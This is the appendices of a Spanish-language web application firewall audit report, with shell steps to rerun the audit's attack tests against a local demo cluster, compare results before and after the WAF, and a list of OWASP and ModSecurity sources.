```

### Anexo B · Cómo reproducir la auditoría

```bash
# 1. Levantar cluster
cd the-store-main
./local.sh create-cluster --skip-tests

# 2. Opción rápida (desde terminal)
bash ../tests/01-pre-waf-attacks.sh | tee ../evidencias/resultados-pre-waf.txt

# 3. Opción visual (desde Chrome)
open ../demo/exploit-dashboard.html     # macOS
# o arrastrar el HTML a una ventana de Chrome

# 4. Comparar pre vs post cuando el WAF esté desplegado
diff <(jq -c '.results[] | {id,status}' evidencias/pocs-data.json) \
     <(jq -c '.results[] | {id,status}' evidencias/pocs-data-post-waf.json)
```


### Anexo C · Fuentes consultadas

- [Web Application Firewall Market — Fortune Business Insights](https://www.fortunebusinessinsights.com/web-application-firewall-market-108841)
- [Web Application Firewall Market — IMARC Group](https://www.imarcgroup.com/web-application-firewall-market)
- [Web Application Firewall Market — Mordor Intelligence](https://www.mordorintelligence.com/industry-reports/web-application-firewall-market)
- [OWASP Top 10 2025 — Introduction](https://owasp.org/Top10/2025/0x00_2025-Introduction/)
- [CRS Project — FAQs](https://coreruleset.org/faq/)
- [Paranoia Level System — DeepWiki / SpiderLabs CRS](https://deepwiki.com/SpiderLabs/owasp-modsecurity-crs/2.3-paranoia-level-system)
- [Introduction to the OWASP ModSecurity Core Rule Set — OWASP Dorset](https://owasp.org/www-chapter-dorset/assets/presentations/2023-06/Introduction_to_the_OWASP_ModSecurity_Core_Rule_Set_Project.pdf)
- [The rise and fall of ModSecurity — Davide Ariu](https://medium.com/@ariudvd/the-rise-and-fall-of-modsecurity-and-the-owasp-core-rule-set-thanks-respectively-to-robust-and-f7fcd3e6d3e2)
- Repo de la app: [`the-store-main/`](the-store-main/)

---
